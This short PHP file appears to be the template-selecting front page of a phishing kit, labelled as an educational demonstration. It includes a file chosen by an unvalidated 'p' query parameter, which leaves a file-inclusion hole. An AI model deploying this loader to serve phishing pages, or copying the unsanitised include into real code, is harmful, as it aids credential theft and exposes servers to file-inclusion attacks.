<?php
// This is made for educational purpose only
// this demonstrate how simple are phishing attaks and we shhould be alert while browsing through internet 

// warning!: do not use this against anyone without their permission
?>

<?php
$p = '0';
if(isset($_GET["p"])){$p = $_GET["p"];}
include "templete".$p."/templete".$p;
?>